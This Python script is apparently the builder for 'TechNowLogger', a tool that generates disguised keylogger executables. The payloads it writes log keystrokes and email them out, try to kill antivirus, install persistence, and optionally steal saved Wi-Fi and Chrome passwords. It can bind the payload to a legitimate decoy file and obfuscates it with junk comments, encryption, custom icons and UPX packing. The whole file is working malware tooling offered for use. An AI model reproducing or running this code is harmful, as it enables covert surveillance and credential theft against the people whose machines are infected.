#!/usr/bin/python3
import sys
import encrypt_code
import argparse
import subprocess
import os
import banners
import shutil
from essential_generators import DocumentGenerator
import platform
from colorama import init
from colorama import Fore, Back, Style
init()

if platform.system() == 'Windows':
    AttackerPlatform = 'Windows'
    WINDOWS_PYTHON_PYINSTALLER_PATH = os.path.expanduser("C:/Python37-32/Scripts/pyinstaller.exe")
elif platform.system() == 'Linux':
    AttackerPlatform = 'Linux'
    WINDOWS_PYTHON_PYINSTALLER_PATH = "wine ~/.wine/drive_c/Python37-32/Scripts/pyinstaller.exe"

def get_arguments():
    parser = argparse.ArgumentParser(description=f'{Fore.RED}TechNowLogger v1.9')
    parser._optionals.title = f"{Fore.GREEN}Optional Arguments{Fore.YELLOW}"
    parser.add_argument("-i", "--interval", dest="interval", help="Time between reports in seconds. default=120", default=120)
    parser.add_argument("-t", "--persistence", dest="time_persistent", help="Becoming Persistence After __ seconds. default=10", default=10)    
    parser.add_argument("-w", "--windows", dest="windows", help="Generate a Windows executable.", action='store_true')
    parser.add_argument("-l", "--linux", dest="linux", help="Generate a Linux executable.", action='store_true')
    parser.add_argument("-s", "--steal-password", dest="stealer", help=f"Steal Saved Password from Victim Machine [{Fore.RED}Supported OS : Windows{Fore.YELLOW}]", action='store_true')
    parser.add_argument("-b", "--bind", dest="bind", help="AutoBinder : Specify Path of Legitimate file.")
    parser.add_argument("-d", "--debug", dest="debug", help="Payload Will Run In Foreground with CMD Window, To get Appropriate Execution Error", action='store_true')
    
    
    required_arguments = parser.add_argument_group(f'{Fore.RED}Required Arguments{Fore.GREEN}')
    required_arguments.add_argument("--icon", dest="icon", help="Specify Icon Path, Icon of Evil File [Note : Must Be .ico].")
    required_arguments.add_argument("-e", "--email", dest="email", help="Email address to send reports to.")
    required_arguments.add_argument("-p", "--password", dest="password", help="Password for the email address given in the -e argument.")
    required_arguments.add_argument("-o", "--out", dest="out", help="Output file name.", required=True)
    return parser.parse_args()

def get_python_pyinstaller_path():
    try:
        if os.name in ('ce', 'nt', 'dos'): 
            # If OS == Windows
            python_path = subprocess.check_output("where pyinstaller.exe", shell=True)

        elif 'posix' in os.name:
            # If OS == Linux
            python_path = subprocess.check_output("which pyinstaller.exe", shell=True)

        python_path = str(python_path).split('\'')[1]
        python_path = python_path.split("\\n")[0]
        python_path = python_path.replace("\\r", "")
        python_path = python_path.replace("\\\\", "/") 
    except Exception:
        python_path = "UnableToFind"

    return python_path

def check_dependencies():
    print(f"{Fore.YELLOW}\n[*] Checking Dependencies...")
    try:
        import mss, essential_generators, PyInstaller, pynput, six
        if platform.system() == 'Windows':
            import win32gui
        print(f"{Fore.GREEN}[+] All Dependencies are Installed on this system ;)\n")
    except Exception as e:
        print(f"{Fore.RED}[!] Error : {e}")
        try:
            print(f"{Fore.YELLOW}[*] Installing All Dependencies From Scratch...\n")
            print(f'\n{Fore.WHITE}[ * * * * * * * * * * * * * * * * * * * * * * * * * ]\n')
            import pip
            while 1:
                pip.main(['install', 'mss==4.0.3'])
                pip.main(['install', 'essential_generators==0.9.2'])
                pip.main(['install', 'PyInstaller'])
                pip.main(['install', 'pynput==1.4.4'])
                pip.main(['install', 'six==1.12.0']) 
                pip.main(['install', 'python-xlib==0.25'])
                pip.main(['install', 'pywin32'])
                print(f'\n{Fore.WHITE}[ * * * * * * * * * * * * * * * * * * * * * * * * * ]\n')
                break
                
        except AttributeError:
            print(f"Error : {e}")
            print(f"{Fore.RED}\n[!] Unable to Install Dependencies, Please Try Again :(\n")        
            print(f"{Fore.RED}\n[!] Try Running This command : python -m pip install --user --upgrade pip==9.0.3\n")
            quit()
        
        except Exception as e:
            print(f"{Fore.RED}\n[!] Unable to Install Dependencies, Please Try Again :( error: {e}\n")
            quit()
            
        try:
            import mss, essential_generators, PyInstaller, pynput, six, win32gui
            if platform.system() == 'Windows':
                import win32gui
            print(f"{Fore.GREEN}\n[+] Dependencies installed successfully ;)\n")
        except Exception as e:
            print(f"{Fore.RED}[!] Unable To Install Dependencies | Error : {e}")
            print(f"{Fore.YELLOW}[ X ] You Are Using Python {sys.version[:5]}")
            print(f"{Fore.YELLOW}[ X ] Try to Install Python 3.7.4")
            quit()        

def create_keylogger(file_name, interval, email, password, time_persistent):
    with open(file_name, "w+") as file:
        file.write("import keylogger, win32event, winerror, win32api\n")
        if arguments.stealer:
            file.write("import threading, password_stealer\n\n")
        
        #Below Codes will check for already running instance,
        file.write("mutex = win32event.CreateMutex(None, 1, 'mutex_var_xboz')\n\n")       

        if arguments.stealer:
            #Saved Password Stealer 
            file.write("def steal():\n")
            file.write(f"\tsteal = password_stealer.SendPass(\'{email}\', \'{password}\')\n")
            file.write(f"\tsteal.get_wifi_creds()\n")
            file.write(f"\tprint(\"[+] Wifi Password Send Successfully!\")\n")
            file.write(f"\tsteal.get_chrome_browser_creds()\n")
            file.write(f"\tprint(\"[+] Chrome Browser Password Send Successfully!\")\n\n")
        
        file.write("def check_and_start():\n")
        file.write("\tif win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:\n")
        file.write("\t\tmutex = None\n")
        file.write("\t\tprint(\"[+] Disabling Keylogger: Already Running\")\n")
        
        file.write("\telse:\n")  # if no instance running, going to run Keylogger        

        if arguments.stealer:
            file.write(f"\t\tt1 = threading.Thread(target=steal)\n")    #Making Stealer Thread  
            file.write(f"\t\tt1.start()\n\n")                           #Starting Thread
        file.write(f"\t\ttechnowlogger = keylogger.Keylogger({interval}, \'{email}\', \'{password}\')\n")        
        file.write("\t\ttechnowlogger.kill_av()\n")        
        file.write(f"\t\ttechnowlogger.become_persistent({time_persistent})\n")
        file.write("\t\ttechnowlogger.start()\n\n")       
        
        file.write("check_and_start()\n")      #Running/Calling the Functions   

def create_keylogger_binded(file_name, interval, email, password, time_persistent, legitimate_file):
    with open(file_name, "w+") as file:
        file.write("import keylogger, sys, subprocess, win32event, winerror, win32api, threading\n")
        if arguments.stealer:
            file.write("import password_stealer\n\n")
        
        #Codes to Run, Legitimate File on Front End
        file.write("def run_front_file():\n")        
        file.write(f"\tfile_name = sys._MEIPASS.replace('\\\\', '/') + \"/{legitimate_file}\" \n")       
        file.write(f"\tsubprocess.call(file_name, shell=True)\n\n")
        
        #Running Front End File on Different Thread
        file.write("t1 = threading.Thread(target=run_front_file)\n")
        file.write("t1.start()\n\n")
               
        #Below Codes will check for already running instance,
        file.write("mutex = win32event.CreateMutex(None, 1, 'mutex_var_xboz')\n\n")
        
        if arguments.stealer:
            #Saved Password Stealer 
            file.write("def steal():\n")
            file.write(f"\tsteal = password_stealer.SendPass(\'{email}\', \'{password}\')\n")
            file.write(f"\tsteal.get_wifi_creds()\n")
            file.write(f"\tprint(\"[+] Wifi Password Send Successfully!\")\n")
            file.write(f"\tsteal.get_chrome_browser_creds()\n")
            file.write(f"\tprint(\"[+] Chrome Browser Password Send Successfully!\")\n\n")        
        
        file.write("def check_and_start():\n")
        file.write("\tif win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:\n")
        file.write("\t\tmutex = None\n")
        file.write("\t\tprint(\"[+] Disabling Keylogger: Already Running\")\n")
                
        file.write("\telse:\n")  # if no instance running, going to run Keylogger

        if arguments.stealer:
            file.write(f"\t\tt2 = threading.Thread(target=steal)\n")    #Making Stealer Thread  
            file.write(f"\t\tt2.start()\n\n")                           #Starting Thread

        file.write(f"\t\ttechnowlogger = keylogger.Keylogger({interval}, \'{email}\', \'{password}\')\n")        
        file.write("\t\ttechnowlogger.kill_av()\n")        
        file.write(f"\t\ttechnowlogger.become_persistent({time_persistent})\n")
        file.write("\t\ttechnowlogger.start()\n\n")            
        file.write("check_and_start()\n") 

def create_keylogger_linux(file_name, interval, email, password, time_persistent):
    with open(file_name, "w+") as file:
        file.write("import keylogger\n")

        file.write(f"technowlogger = keylogger.Keylogger({interval}, \'{email}\', \'{password}\')\n")        
        file.write("technowlogger.kill_av()\n")        
        file.write(f"technowlogger.become_persistent({time_persistent})\n")
        file.write("technowlogger.start()\n")     
        
def obfuscating_payload(file_name):
    gen = DocumentGenerator()
    text = "#" + gen.sentence() 
    with open(file_name, "a") as file:
        file.write(text)

def compile_for_windows(file_name, icon_path):
    if arguments.stealer and arguments.debug:
        subprocess.call(f"{WINDOWS_PYTHON_PYINSTALLER_PATH} --onefile --hidden-import=win32event --hidden-import=winerror --hidden-import=win32api --hidden-import=pynput.keyboard --hidden-import=keylogger --hidden-import=password_stealer {file_name} -i {icon_path}", shell=True) 
    elif arguments.debug:
        subprocess.call(f"{WINDOWS_PYTHON_PYINSTALLER_PATH} --onefile --hidden-import=win32event --hidden-import=winerror --hidden-import=win32api --hidden-import=pynput.keyboard --hidden-import=keylogger {file_name} -i {icon_path}", shell=True)         
    elif arguments.stealer:
        subprocess.call(f"{WINDOWS_PYTHON_PYINSTALLER_PATH} --onefile --noconsole --hidden-import=win32event --hidden-import=winerror --hidden-import=win32api --hidden-import=pynput.keyboard --hidden-import=keylogger --hidden-import=password_stealer {file_name} -i {icon_path}", shell=True)
    else:
        subprocess.call(f"{WINDOWS_PYTHON_PYINSTALLER_PATH} --onefile --noconsole --hidden-import=win32event --hidden-import=winerror --hidden-import=win32api --hidden-import=pynput.keyboard --hidden-import=keylogger {file_name} -i {icon_path}", shell=True)

def compile_for_windows_binded(file_name, icon_path):
    if arguments.stealer and arguments.debug:
        subprocess.call(f"{WINDOWS_PYTHON_PYINSTALLER_PATH} --onefile --hidden-import=win32event --hidden-import=winerror --hidden-import=win32api --hidden-import=pynput.keyboard --hidden-import=keylogger --hidden-import=password_stealer {file_name} -i {icon_path} --add-data \"{arguments.bind};.\"", shell=True)
    elif arguments.debug:
        subprocess.call(f"{WINDOWS_PYTHON_PYINSTALLER_PATH} --onefile --hidden-import=win32event --hidden-import=winerror --hidden-import=win32api --hidden-import=pynput.keyboard --hidden-import=keylogger {file_name} -i {icon_path} --add-data \"{arguments.bind};.\"", shell=True)
    elif arguments.stealer:
        subprocess.call(f"{WINDOWS_PYTHON_PYINSTALLER_PATH} --onefile --noconsole --hidden-import=win32event --hidden-import=winerror --hidden-import=win32api --hidden-import=pynput.keyboard --hidden-import=keylogger --hidden-import=password_stealer {file_name} -i {icon_path} --add-data \"{arguments.bind};.\"", shell=True)
    else:
        subprocess.call(f"{WINDOWS_PYTHON_PYINSTALLER_PATH} --onefile --noconsole --hidden-import=win32event --hidden-import=winerror --hidden-import=win32api --hidden-import=pynput.keyboard --hidden-import=keylogger {file_name} -i {icon_path} --add-data \"{arguments.bind};.\"", shell=True)    

def compile_for_linux(file_name, icon_path):
    if arguments.debug:
        subprocess.call(f"pyinstaller --onefile --hidden-import=pynput.keyboard --hidden-import=keylogger {file_name} -i {icon_path}", shell=True)
    else:
        subprocess.call(f"pyinstaller --onefile --noconsole --hidden-import=pynput.keyboard --hidden-import=keylogger {file_name} -i {icon_path}", shell=True)

def pack_exe_using_upx():
    if os.path.exists(os.getcwd() + "\\upx\\upx.exe") and os.path.exists(os.getcwd() + f"\\dist\\{arguments.out}.exe"):
        shutil.copy2(f"{os.getcwd()}\\upx\\upx.exe", f"{os.getcwd()}\\dist")
        os.chdir(f"{os.getcwd()}\\dist") 
        
        print(f"{Fore.YELLOW}\n[*] Packing Exe Using UPX")
        os.system(f"upx.exe {arguments.out}.exe > log.txt")
        os.remove("log.txt")
        os.remove("upx.exe")
        print(f"{Fore.GREEN}[+] Packed Successfully !")

def del_junk_file(file_name):
    try:
        if platform.system() == 'Windows':        
            build = os.getcwd() + "\\build"
            file_name = os.getcwd() + f"\\{file_name}"
            pycache = os.getcwd() + "\\__pycache__"
            os.remove(file_name)
            os.remove(file_name + ".spec")    
            shutil.rmtree(build)
            shutil.rmtree(pycache)
        if platform.system() == 'Linux':   
            file_spec = file_name + ".spec"
            os.system(f"rm -r build/ __pycache__/ {file_spec} {file_name}")                    
    except Exception:
        pass


def exit_greet():
    try:
        os.system('cls')
    except Exception as e:
        os.system('clear')        
    print(Fore.GREEN + '''Happy Hacking ~TechNowLogger!   \n''' + Style.RESET_ALL)
    quit()
    
if __name__ == '__main__':
    if platform.system() == 'Linux':     
        os.system('rm -Rf dist')
        if not os.geteuid() == 0:
            sys.exit('Technowlogger must be run as root')         
    if platform.system() == 'Windows': 
        dist_folder = os.getcwd() + "/dist"
        try:
            shutil.rmtree(dist_folder)
        except Exception:
            pass
       
        
    try:
        print(banners.get_banner())
        print(f"\t\t{Fore.YELLOW}Author: {Fore.GREEN}Pushpender | {Fore.YELLOW}GitHub: {Fore.GREEN}@PushpenderIndia\n")

        arguments = get_arguments()       
        
        if arguments.icon == None:
            arguments.icon = input(f'{Fore.RED}[!] Please Specify Icon Path {Fore.WHITE}[{Fore.GREEN}LEAVE BLANK to SET icon/exe.ico as icon{Fore.WHITE}] : ')
            if arguments.icon == "":
                arguments.icon = "icon/exe.ico"      

        if not os.path.exists(WINDOWS_PYTHON_PYINSTALLER_PATH.replace("wine ", "")) and arguments.windows:
            WINDOWS_PYTHON_PYINSTALLER_PATH = get_python_pyinstaller_path()
            if WINDOWS_PYTHON_PYINSTALLER_PATH == "UnableToFind":
                print(f'{Fore.RED}[!] Default Pyinstaller Path inside Wine Directory is Incorrect')
                print(f'{Fore.RED}[!] {Fore.WHITE}[Please Update Line 19 Later] [{Fore.RED}DefautPath: {Fore.WHITE}~/.wine/drive_c/Python37-32/Scripts/pyinstaller.exe]')
                WINDOWS_PYTHON_PYINSTALLER_PATH = "wine "
                WINDOWS_PYTHON_PYINSTALLER_PATH += input(f'\n{Fore.WHITE}[?] Enter pyinstaller.exe path manually : ')

        print(f'\n{Fore.GREEN}[ * * * * * * * * * * * * * * * * * * * * * * * * * ]{Fore.GREEN}')
        print(f'\n   {Fore.YELLOW}Email:{Fore.RED} ' + arguments.email)
        print(f'   {Fore.YELLOW}Password:{Fore.RED} ' + arguments.password) 
        print(f'   {Fore.YELLOW}Log\'s Send Interval:{Fore.RED} Every ' + str(arguments.interval) + ' seconds')
        print(f'   {Fore.YELLOW}Becomes Persistence After:{Fore.RED} ' + str(arguments.time_persistent) + ' seconds')
        print(f'   {Fore.YELLOW}Output Evil File Name:{Fore.RED} ' + arguments.out) 
        print(f'   {Fore.YELLOW}Icon Path:{Fore.RED} ' + arguments.icon)
        print(f'   {Fore.YELLOW}Pyinstaller Path:{Fore.RED} ' + WINDOWS_PYTHON_PYINSTALLER_PATH + f" {Fore.YELLOW}[{Fore.WHITE}Manually Update line: 19 & 22, If this PATH is Incorrect{Fore.YELLOW}]")
        
        if arguments.bind != None:
            print(f'   {Fore.YELLOW}Binding To [{Fore.RED}Legitimate File Path{Fore.YELLOW}]:{Fore.RED} ' + str(arguments.bind))
            
        print(f'\n{Fore.GREEN}[ * * * * * * * * * * * * * * * * * * * * * * * * * ]')
        
        ask = input(f'\n{Fore.WHITE}[?] Are the above mentioned credentials correct? (y/n) : ')
    
        if ask.lower() == 'y':
            pass
        else:
            arguments.email = input('\n[?] Type your gmail to receive logs: ')
            arguments.password = input('[?] Type your gmail password: ')
            arguments.interval = int(input(f'[?] Time interval to send logs; [{Fore.RED}In Seconds{Fore.WHITE}]: '))
            arguments.time_persistent = int(input(f'[?] Time after to become persistence; [{Fore.RED}In Seconds{Fore.WHITE}]: '))   
            arguments.out = input('[?] Output Evil File Name: ')  
            arguments.icon = input(f'[?] Icon Path [{Fore.RED}If Present In This Directory, then just type Name{Fore.WHITE}]: ')  
            if arguments.bind != None:
                arguments.bind = input(f'[?] Path of Legitimate File [{Fore.RED}.exe is Recommended{Fore.WHITE}]: ')

        check_dependencies()

        print(f"\n{Fore.YELLOW}[*] Generating Please wait for a while...{Fore.MAGENTA}\n")

        if arguments.windows:
            if arguments.bind == '' or arguments.bind == None:
                create_keylogger(arguments.out, arguments.interval, arguments.email, arguments.password, int(arguments.time_persistent))
            else:
                create_keylogger_binded(arguments.out, arguments.interval, arguments.email, arguments.password, int(arguments.time_persistent), arguments.bind.split("\\")[-1])            
        else:
            create_keylogger_linux(arguments.out, arguments.interval, arguments.email, arguments.password, int(arguments.time_persistent))            
        
        obfuscating_payload(arguments.out)
        
        encrypting_code = encrypt_code.Encrypt()
        encrypting_code.encrypt(arguments.out)

        print(f"{Fore.MAGENTA}")

        if AttackerPlatform == 'Windows':
            if arguments.bind == None or arguments.bind == "":
                compile_for_windows(arguments.out, arguments.icon)
            else:
                compile_for_windows_binded(arguments.out, arguments.icon)
                
        elif AttackerPlatform == 'Linux':
            if arguments.windows:
                if arguments.bind == None or arguments.bind == "":
                    compile_for_windows(arguments.out, arguments.icon)
                else:
                    compile_for_windows_binded(arguments.out, arguments.icon)

            elif arguments.linux:
                compile_for_linux(arguments.out, arguments.icon)  

            else:
                print(f"{Fore.RED}[!] Please Specify {Fore.YELLOW}-w{Fore.RED} for {Fore.GREEN}WINDOWS{Fore.RED} or {Fore.YELLOW}-l{Fore.RED} for {Fore.GREEN}LINUX{Fore.RED} payload generation")

        print(f"\n{Fore.YELLOW}[*] Deleting Junk Files...")
        del_junk_file(arguments.out)
        print(f"{Fore.GREEN}[+] Junk Files Removed Successfully!")
        
        if os.path.exists(f'dist/{arguments.out}.exe') or os.path.exists(f'dist/{arguments.out}') or os.path.exists(f'~/opt/technowloogger/dist/{arguments.out}.exe') or os.path.exists(f'{os.getcwd()}\\dist\\{arguments.out}.exe'):
            print(f"\n{Fore.GREEN}[+] Generated Successfully!\n")

            pack_exe_using_upx()
            
            print(f"\n\n{Fore.RED}[***] Don't forget to allow less secure applications in your Gmail account.")
            print(f"{Fore.GREEN}Use the following link to do so https://myaccount.google.com/lesssecureapps")
            print(f"\n{Fore.RED} :O-) TIP{Fore.YELLOW} : USE ICONS from {Fore.RED}icon{Fore.YELLOW} folder like this >>  {Fore.RED}--icon icon/exe.ico")

        else:
            print(f"\n{Fore.RED}[!] Failed To Generate Your Payload :(, Please Try Again!\n")
            print(f"\n{Fore.GREEN}[:D] Please Contact us on https://github.com/PushpenderIndia/technowlogger\n")                  
    
    except KeyboardInterrupt:        
        exit_greet()
        del_junk_file(arguments.out)
        
        
